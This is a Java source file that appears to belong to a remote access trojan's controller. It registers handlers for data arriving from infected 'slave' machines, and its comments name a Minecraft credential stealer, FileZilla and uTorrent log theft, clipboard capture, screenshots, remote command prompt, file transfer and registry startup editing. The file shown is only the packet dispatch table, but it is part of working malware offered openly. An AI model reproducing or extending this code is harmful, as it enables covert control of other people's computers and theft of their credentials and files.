package com.redpois0n.packets;

import java.util.HashMap;
import java.util.Set;

import com.redpois0n.Slave;
import com.redpois0n.plugins.PluginEventHandler;


public class Packets {

	private static final HashMap<String, Class<? extends AbstractPacket>> incomingPackets = new HashMap<String, Class<? extends AbstractPacket>>();
	
	public static HashMap<String, Class<? extends AbstractPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload(){
		incomingPackets.clear();
		incomingPackets.put("LOCALE", PacketLOCALE.class);
		incomingPackets.put("INSTLOCALES", PacketINSTLOCALES.class);
		incomingPackets.put("DISCONNECT", PacketDISCONNECT.class); // disconnect
		incomingPackets.put("STAT", PacketSTAT.class); // status
		incomingPackets.put("COMPUTERNAME", PacketCOMPUTERNAME.class); // computername
		incomingPackets.put("SERVERID", PacketSERVERID.class); // server id
		incomingPackets.put("OSNAME", PacketOSNAME.class); // os name
		incomingPackets.put("IMAGECOMING", PacketIMAGECOMING.class); // image
		incomingPackets.put("SINGLEIMAGECOMING", PacketSINGLEIMAGECOMING.class); // single image
		incomingPackets.put("FOLDERLIST", PacketFOLDERLIST.class); // list of folders in dir
		incomingPackets.put("PROCESS", PacketPROCESS.class); // process
		incomingPackets.put("CMD", PacketCMD.class); // command prompt line
		incomingPackets.put("USERNAME", PacketUSERNAME.class); // username
		incomingPackets.put("SERVERPATH", PacketSERVERPATH.class); // server path
		incomingPackets.put("HERERAM", PacketHERERAM.class); // ram
		incomingPackets.put("JAVAVER", PacketJAVAVER.class); // java version
		incomingPackets.put("JAVAPATH", PacketJAVAPATH.class); // javapath
		incomingPackets.put("URLSTAT", PacketURLSTAT.class); // adv downloader info
		incomingPackets.put("LOCALIP", PacketLOCALIP.class); // local ip
		incomingPackets.put("FILE", PacketFILE.class); // file transfer
		incomingPackets.put("VERSION", PacketVERSION.class); // version
		incomingPackets.put("DATE", PacketDATE.class); // date of install
		incomingPackets.put("VARPROP", PacketVARPROP.class); // system env / prop
		incomingPackets.put("THUMBNAIL", PacketTHUMBNAIL.class); // tumbnail
		incomingPackets.put("DIR", PacketDIR.class); // get dir
		incomingPackets.put("CHAT", PacketCHAT.class); // chat
		incomingPackets.put("MC", PacketMC.class); // minecraft stealer
		incomingPackets.put("FF", PacketFF.class); // file finder
		incomingPackets.put("HOSTF", PacketHOSTF.class); // host file text
		incomingPackets.put("HOSTANSW", PacketHOSTANSW.class); // host file answer
		incomingPackets.put("UTOR", PacketUTOR.class); // utorrent logs
		incomingPackets.put("CBOARDC", PacketCBOARDC.class); // clipboard contents
		incomingPackets.put("FC", PacketFC.class); // file preview
		incomingPackets.put("IC", PacketIC.class); // image preview
		incomingPackets.put("JVM", PacketJVM.class); // JVM info
		incomingPackets.put("ZIP", PacketZIP.class); // zip preview
		incomingPackets.put("MD5", PacketMD5.class); // file md5
		incomingPackets.put("COUNTRY", PacketCOUNTRY.class); // user.country backup
		incomingPackets.put("FZ", PacketFZ.class); // filezilla
		incomingPackets.put("LAN", PacketLAN.class); // lan view
		incomingPackets.put("IPC", PacketIPC.class); // ipconfig
		incomingPackets.put("APORT", PacketAPORT.class); //active port
		incomingPackets.put("WINSER", PacketWINSER.class); //windows service listing
		incomingPackets.put("REGSTART", PacketREGSTART.class); //registry startup listing
		incomingPackets.put("REG", PacketREG.class); //registry enter
		incomingPackets.put("INSTPROG", PacketINSTPROG.class); //installed program list
		incomingPackets.put("ADAPT", PacketADAPT.class); //network adapters list
		incomingPackets.put("RAWINFO", PacketRAWINFO.class); //raw info listing
		incomingPackets.put("SO", PacketSO.class); //sound 
		incomingPackets.put("IMGLIST", PacketIMGLIST.class); //thumbnail preview
		incomingPackets.put("ERROR", PacketERROR.class); //error
		incomingPackets.put("MONITOR", PacketMONITOR.class); //monitors listing
		incomingPackets.put("DRIVES", PacketDRIVES.class); //drives listing
		incomingPackets.put("RAM", PacketRAM.class); //ram
		incomingPackets.put("APS", PacketAPS.class); //available processors
		incomingPackets.put("ERRLOG", PacketERRLOG.class); //error log file
		incomingPackets.put("CONFIG", PacketCONFIG.class); //config list
		incomingPackets.put("PLUGIN", PacketPLUGIN.class); //plugin list		
		incomingPackets.put("QUICKDESKTOP", PacketQUICKDESKTOP.class); //quick desktop
	}

	public static boolean execute(String line, Slave slave) {
		try {
			AbstractPacket ac = null;
			Set<String> set = incomingPackets.keySet();
			for (String str : set) {
				if (str.equals(line)) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}
			if (ac != null) {
				if (line.equals("REGSTART")) {
					new PacketREGSTART().read(slave, line);
				} else if (line.equals("SO")) {
					PacketSO.handle(slave);
				} else {
					ac.read(slave, line);
				}
			}
			
			PluginEventHandler.onPacket(slave, line);
			
			return ac != null;
		} catch (Exception ex) {
			Exception ex1 = new Exception("Failed to handle packet: " + line, ex);
			ex1.printStackTrace();
			return false;
		}
	}

}
